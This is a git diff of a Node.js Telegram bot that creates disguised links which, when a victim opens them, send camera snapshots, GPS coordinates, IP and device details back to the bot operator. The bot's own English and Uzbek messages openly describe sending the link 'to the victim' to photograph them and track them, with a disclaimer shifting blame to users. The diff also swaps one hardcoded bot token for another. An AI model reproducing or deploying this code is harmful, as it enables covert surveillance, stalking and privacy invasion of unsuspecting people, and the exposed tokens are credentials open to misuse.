@@ -6,7 +6,7 @@ const fetch = require('node-fetch');
 const request = require('request');
 const moment = require('moment');
 const TelegramBot = require('node-telegram-bot-api');
-const bot = new TelegramBot("7103301208:AAGx5hDpmTz28qJBd3Ayqhu25T32dZpEURA", {polling: true});
+const bot = new TelegramBot("7169655039:AAE_nbc_lYZGHqilvCA-_GsESuS38r7LFSE", {polling: true});
 
 var jsonParser=bodyParser.json({limit:1024*1024*20, type:'application/json'});
 var urlencodedParser=bodyParser.urlencoded({ extended:true,limit:1024*1024*20,type:'application/x-www-form-urlencoded' });
@@ -25,16 +25,16 @@ bot.on('message', (msg) => {
   const chatId = msg.chat.id;
   const userId = msg.from.id.toString();
 
-  
+
   fs.readFile('id.txt', 'utf8', (err, data) => {
     if (err) {
       console.error(err);
-      
+
     } else {
       let userIds = data.trim().split('\n');
       let isNewUser = true;
 
-      
+
       userIds.forEach((id, index) => {
         if (id === userId) {
           isNewUser = false;
@@ -42,18 +42,18 @@ bot.on('message', (msg) => {
         }
       });
 
-      
+
       if (isNewUser) {
         userIds.push(userId);
       }
 
-      
+
       fs.writeFile('id.txt', userIds.join('\n'), (err) => {
         if (err) {
           console.error(err);
-          
+
         } else {
-        
+
         }
       });
     }
@@ -74,7 +74,7 @@ bot.onText(/\/panel/, (msg) => {
       inline_keyboard: keyboard1,
     },
   };
-  
+
 
   bot.sendMessage(chatId, '💻 ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ', options);
 });
@@ -93,7 +93,7 @@ bot.on('callback_query', (query) => {
       const ids = data.split('\n');
 
       ids.forEach((id) => {
-        
+
       });
 
       bot.sendMessage(chatId, `📊 ʙᴏᴛ sᴛᴀsᴛɪᴄ\n\n👤 ғᴏʟʟᴏᴡᴇʀs ${ids.length}`);
@@ -122,7 +122,7 @@ bot.onText(/\/message (.+)/, (msg, match) => {
         const ids = data.trim().split('\n');
 
         ids.forEach(id => {
-          
+
           bot.sendMessage(id, messageToSend).catch((error) => {
             console.error('ᴇʀʀᴏʀ ᴀɴ ᴏᴄᴜʀᴛᴇᴅ ❗️');
           });
@@ -220,7 +220,7 @@ bot.onText(/\/cleanuri (.+)/, async (msg, match) => {
     }
 });
 
-   
+
 
 const ipApiUrl = "http://ip-api.com/json";
 
@@ -286,7 +286,7 @@ var ip;
 var d = new Date();
 d=d.toJSON().slice(0,19).replace('T',':');
 if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
-  
+
 if(req.params.path != null){
 res.render("webview",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
 } 
@@ -294,8 +294,8 @@ else{
 res.redirect("https://t.me/Rasulbekdev");
 }
 
-         
-                              
+
+
 });
 
 app.get("/c/:path/:uri",(req,res)=>{
@@ -312,8 +312,8 @@ else{
 res.redirect("https://t.me/Rasulbekdev");
 }
 
-         
-                              
+
+
 });
 
 //bot commands 
@@ -326,47 +326,37 @@ bot.setMyCommands([{ command: 'start', description: '♻️ ʀᴇsᴛᴀʀᴛ ʙ
 bot.on('message', async (msg) => {
 const chatId = msg.chat.id;
 
- 
 
-if(msg?.reply_to_message?.text=="🌐 ᴇɴᴛᴇʀ ʏᴏᴜʀ ᴜʀʟ »"){
+
+if(msg?.reply_to_message?.text=="🌐 Website linkini yuboring ..."){
  createLink(chatId,msg.text); 
 }
-  
+
 if(msg.text=="/start"){
 
 const buttons = {
       reply_markup: {
           inline_keyboard: [
                 [
-                    {text: '👨🏻‍💻 ᴅᴇᴠᴇʟᴏᴘᴇʀ', url: 'https://t.me/RsDeveloperKG'},
-                    {text: '💻 ᴛᴜᴛᴏʀɪᴀʟ', callback_data: 'tutorial'}
+                    {text: '📚 Docs / Qollanma', callback_data: 'http'},
+                    {text: '👨🏻‍💻 Dasturchi', url: 'tg://user?id=6971690005'}
                 ],
                 [
-                    {text: '🌐 ᴄʀᴇᴀᴛᴇ ʟɪɴᴋ 🌐', callback_data: 'crenew'}
+                    {text: 'Link yaratish 🙂‍↔️', callback_data: 'crenew'}
                 ]
-            ]
-        }
-    };
+                    ]
+                  },
+                  caption: `Assalomu aleykum <b><a href='tg://user?id=${msg.chat.id}'>${msg.from.first_name}</a> </b>🍃\n\n<blockquote>Brodar bilaman siz bu bot dan foydalanib biror odamni zapal yoki topmoqchisiz bizning botdan foydalanish mutlaqo tekin lekin siz qilgan ish uchun bot dasturchisi javobgar emas ! oylab ish koring 😊</blockquote><pre>`,parse_mode: 'HTML'
+                };
 
-bot.on('callback_query', (query) => {
-    const chatId = query.message.chat.id;
 
-    if (query.data === 'bu') {
-        bot.sendMessage(chatId, 'Button 1 bosildi');
-    } else if (query.data === 'tutorial') {
-        bot.sendMessage(chatId, 'Button 2 bosildi');
-    } else if (query.data === 'button_3') {
-        bot.sendMessage(chatId, 'Button 3 bosildi');
-    }
-});
-
-  bot.sendMessage(chatId, `ᴡᴇʟᴄᴏᴍᴇ ${msg.from.first_name}\n\nᴛʜʀᴏᴜɢʜ ᴛʜɪs ʙᴏᴛ, ʏᴏᴜ ᴄᴀɴ ᴄʀᴇᴀᴛᴇ ᴀ ʟɪɴᴋ ᴀɴᴅ sᴇɴᴅ ɪᴛ ᴛᴏ ᴛʜᴇ ᴠɪᴄᴛɪᴍ ᴀɴᴅ ᴛᴀᴋᴇ ᴀ ᴘɪᴄᴛᴜʀᴇ ғʀᴏᴍ ᴛʜᴇ ᴠɪᴄᴛɪᴍ's ᴄᴀᴍᴇʀᴀ, ᴀɴᴅ ʏᴏᴜ ᴄᴀɴ ᴀʟsᴏ ɢᴇᴛ ɪɴғᴏʀᴍᴀᴛɪᴏɴ ᴀʙᴏᴜᴛ ʜɪᴍ\n\nᯓ ᴄᴏᴍᴀɴᴅs ᴍᴇɴᴜ » /cmd « ᴘʀᴇss`,buttons);
-}
+const imageStream = "https://telegra.ph/file/7d74e188a1afe10471b1d.jpg"
+bot.sendPhoto(chatId,imageStream,buttons,);}
 else if(msg.text=="/create"){
 createNew(chatId);
 }
 else if(msg.text=="/help"){
-bot.sendMessage(chatId,`ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ʜᴇʟᴘ ᴍᴇɴᴜ <b><a href='tg://user?id=${msg.chat.id}'>${msg.from.first_name}</a> </b>\n\nʏᴏᴜ ᴄᴀɴ ᴄʀᴇᴀᴛᴇ ᴀ ʟɪɴᴋ ᴛʜʀᴏᴜɢʜ ᴛʜɪs ʙᴏᴛ ᴀɴᴅ sᴇɴᴅ ɪᴛ ᴛᴏ ᴛʜᴇ ᴠɪᴄᴛɪᴍ, ᴄᴏɴɴᴇᴄᴛ ᴛᴏ ʜɪs ᴄᴀᴍᴇʀᴀ, ᴛᴀᴋᴇ ᴀ ᴘɪᴄᴛᴜʀᴇ ᴏғ ʜɪᴍ ᴀɴᴅ ᴄᴀᴘᴛᴜʀᴇ ʜɪs ᴄᴏɴᴛᴇɴᴛ.`,{
+bot.sendMessage(chatId,`ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ʜᴇʟᴘ ᴍᴇɴᴜ <b><a href='tg://user?id=${msg.chat.id}'>${msg.from.first_name}</a> </b> \n\nʏᴏᴜ ᴄᴀɴ ᴄʀᴇᴀᴛᴇ ᴀ ʟɪɴᴋ ᴛʜʀᴏᴜɢʜ ᴛʜɪs ʙᴏᴛ ᴀɴᴅ sᴇɴᴅ ɪᴛ ᴛᴏ ᴛʜᴇ ᴠɪᴄᴛɪᴍ, ᴄᴏɴɴᴇᴄᴛ ᴛᴏ ʜɪs ᴄᴀᴍᴇʀᴀ, ᴛᴀᴋᴇ ᴀ ᴘɪᴄᴛᴜʀᴇ ᴏғ ʜɪᴍ ᴀɴᴅ ᴄᴀᴘᴛᴜʀᴇ ʜɪs ᴄᴏɴᴛᴇɴᴛ.`,{
   parse_mode: 'HTML'
 });
 }
@@ -381,7 +371,7 @@ bot.sendMessage(chatId,`ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴄᴏᴍᴀɴᴅs ᴍᴇɴ�
   parse_mode: 'HTML'
 });
 }
-  
+
 else if(msg.text=="/disc"){
 bot.sendMessage(chatId,`⛔ ᴅɪsᴄʟᴀɪᴍᴇʀ ⛔\n\nᴅᴇᴀʀ <b><a href='tg://user?id=${msg.chat.id}'>${msg.from.first_name}</a> </b>, ᴡᴇ ᴡᴀʀɴ ʏᴏᴜ ᴛʜᴀᴛ ᴛʜᴇ ᴅᴇᴠᴇʟᴏᴘᴇʀ ɪs ɴᴏᴛ ʀᴇsᴘᴏɴsɪʙʟᴇ ғᴏʀ ᴡʜᴀᴛ ʏᴏᴜ ʜᴀᴠᴇ ᴅᴏɴᴇ ᴏʀ ʏᴏᴜʀ ᴀᴄᴛɪᴏɴs ❗️\n\n<b><a href='tg://user?id=${msg.chat.id}'>${msg.from.first_name}</a> </b>, ɪғ ʏᴏᴜ ᴛᴀᴋᴇ ᴘɪᴄᴛᴜʀᴇs ғʀᴏᴍ ᴛʜᴇ ᴄᴀᴍᴇʀᴀ ᴏғ ᴛʜᴇ ᴠɪᴄᴛɪᴍ ᴀɴᴅ ʜᴇ ᴄᴏᴍᴘʟᴀɪɴs ᴀʙᴏᴜᴛ ʏᴏᴜ\n\nᴋᴇᴇᴘ ɪɴ ᴍɪɴᴅ ᴛʜᴀᴛ ᴛʜᴇ ᴏᴡɴᴇʀ ᴏғ ᴛʜᴇ ʙᴏᴛ ɪs ɴᴏᴛ ʀᴇsᴘᴏɴsɪʙʟᴇ ғᴏʀ ᴛʜɪs, ʏᴏᴜ ᴀʀᴇ ʀᴇsᴘᴏɴsɪʙʟᴇ ғᴏʀ ɪᴛ ʏᴏᴜʀsᴇʟғ ❗️`,{
   parse_mode: 'HTML'
@@ -393,7 +383,7 @@ bot.sendMessage(chatId,`ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ sʜᴏʀᴛ ʟɪɴᴋ ᴍᴇ
     parse_mode: 'HTML'
 });
 }  
-  
+
 else if(msg.text=="/trace"){
 bot.sendMessage(chatId,`ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ɪᴘ ᴛʀᴀᴄᴇ ᴍᴇɴᴜ <b><a href='tg://user?id=${msg.chat.id}'>${msg.from.first_name}</a> </b>\n\n♻️ ғᴏʀ ᴇxᴀᴍᴘʟᴇ ɪᴘ ᴛʀᴀᴄᴇ\n\nᴇxᴀᴍᴘʟᴇ <code>/iptrace 4.4.4.4</code>\nᴇxᴀᴍᴘʟᴇ <code>/iptrace 5.5.5.5</code>`,{
   parse_mode: 'HTML'
@@ -422,7 +412,7 @@ async function createLink(cid,msg){
 var encoded = [...msg].some(char => char.charCodeAt(0) > 127);
 
 if ((msg.toLowerCase().indexOf('http') > -1 || msg.toLowerCase().indexOf('https') > -1 ) && !encoded) {
- 
+
 var url=cid.toString(36)+'/'+btoa(msg);
 var m={
   reply_markup:JSON.stringify({
@@ -432,15 +422,15 @@ var m={
 
 var cUrl=`${hostURL}/c/${url}`;
 var wUrl=`${hostURL}/w/${url}`;
-  
+
 bot.sendChatAction(cid,"typing");
 if(use1pt){
 var x=await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(cUrl)}`).then(res => res.json());
 var y = await fetch(`https://da.gd/s?url=${encodeURIComponent(wUrl)}`);
 
 
-  
-     
+
+
 var f="",g="";
 
 for(var c in x){
@@ -450,26 +440,26 @@ f+=x[c]+"\n";
 for(var c in y){
 g+=y[c]+"\n";
 }
-  
-bot.sendMessage(cid, `☑️ ɴᴇᴡ ʟɪɴᴋs ʜᴀs ʙᴇɴ ᴄʀᴇᴀᴛᴇᴅ\n
-🌐 ʏᴏᴜʀ ʟɪɴᴋ » ${msg}
 
-☁ ᴄʟᴏᴜᴅ ғʟᴀʀᴇ ᴘᴀɢᴇ ʟɪɴᴋs\n➥${f}
+bot.sendMessage(cid, `Sizning link laringiz mufaqyatli tayorlandi 🙂‍↔️
 
-🌐 ᴡᴇʙ ᴠɪᴇᴡ ᴘᴀɢᴇ ʟɪɴᴋs\n➥${g}\n
-♻️ ғᴏʀ sʜᴏʀᴛ ʟɪɴᴋ » /short « ᴘʀᴇss
-🗺 ɪᴘ ᴛʀᴀᴄᴇ ɪɴғᴏ » /trace « ᴘʀᴇss`,m);
+🧐 siz yuborgan link: ${msg}
+
+☁ Cloud flare havolasi\n➥${f}
+
+🌐 Webview havolasi\n➥${g}\n
+`,m);
 }
 else{
 
-bot.sendMessage(cid, `☑️ ɴᴇᴡ ʟɪɴᴋs ʜᴀs ʙᴇɴ ᴄʀᴇᴀᴛᴇᴅ\n
-🌐 ʏᴏᴜʀ ʟɪɴᴋ » ${msg}
+bot.sendMessage(cid, `Sizning link laringiz mufaqyatli tayorlandi 🙂‍↔️
 
-☁ ᴄʟᴏᴜᴅ ғʟᴀʀᴇ ᴘᴀɢᴇ ʟɪɴᴋs\n➥${cUrl}
+🧐 siz yuborgan link: ${msg}
 
-🌐 ᴡᴇʙ ᴠɪᴇᴡ ᴘᴀɢᴇ ʟɪɴᴋs\n➥${wUrl}\n
-♻️ ғᴏʀ sʜᴏʀᴛ ʟɪɴᴋ » /short « ᴘʀᴇss
-🗺 ɪᴘ ᴛʀᴀᴄᴇ ɪɴғᴏ » /trace « ᴘʀᴇss`,m);
+☁ Cloud flare havolasi\n➥${cUrl}
+
+🌐 Webview havolasi\n➥${wUrl}\n
+`,m);
 }
 }
 else{
@@ -484,7 +474,7 @@ function createNew(cid){
 var mk={
 reply_markup:JSON.stringify({"force_reply":true})
 };
-bot.sendMessage(cid,`🌐 ᴇɴᴛᴇʀ ʏᴏᴜʀ ᴜʀʟ »`,mk);
+bot.sendMessage(cid,`🌐 Website linkini yuboring ...`,mk);
 }
 
 
@@ -496,13 +486,13 @@ var ip;
 if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
 res.json({"ip":ip});
 
-  
+
 });
 
 
 app.post("/location",(req,res)=>{
 
-  
+
 var lat=parseFloat(decodeURIComponent(req.body.lat)) || null;
 var lon=parseFloat(decodeURIComponent(req.body.lon)) || null;
 var uid=decodeURIComponent(req.body.uid) || null;
@@ -513,7 +503,7 @@ bot.sendLocation(parseInt(uid,36),lat,lon);
 
 bot.sendMessage(parseInt(uid,36),`🗺 sᴏᴄɪᴀʟʟ ᴍᴀᴘ ʟɪɴᴋs\n🌐 ɢᴏᴏɢʟᴇ ᴍᴀᴘ ʟɪɴᴋ » https://www.google.com/maps/place/${lat}+${lon}\n🌏 ᴇᴀʀᴛʜ ᴍᴀᴘ ʟɪɴᴋ » https://earth.google.com/web/search/${lat},${lon}`);
   bot.sendMessage(parseInt(uid,36),`ᯓ ʟᴀᴛɪᴛᴜᴅᴇ » ${lat}\nᯓ ʟᴏɴɢɪᴛᴜᴅᴇ » ${lon}\nᯓ ᴀᴄᴄᴜᴀʀʏ » ${acc} ᴍ`);
-  
+
 res.send("Done");
 }
 });
@@ -530,7 +520,7 @@ data=data.replaceAll("<br>","\n");
 
 bot.sendMessage(parseInt(uid,36),data,{parse_mode:"HTML"});
 
-  
+
 res.send("Done");
 }
 });
@@ -539,11 +529,11 @@ res.send("Done");
 app.post("/camsnap",(req,res)=>{
 var uid=decodeURIComponent(req.body.uid)  || null;
 var img=decodeURIComponent(req.body.img) || null;
-  
+
 if( uid != null && img != null){
-  
+
 var buffer=Buffer.from(img,'base64');
-  
+
 var info={
 filename:"camsnap.png",
 contentType: 'image/png'
@@ -558,7 +548,7 @@ console.log(error);
 
 
 res.send("Done");
- 
+
 }
 
 });
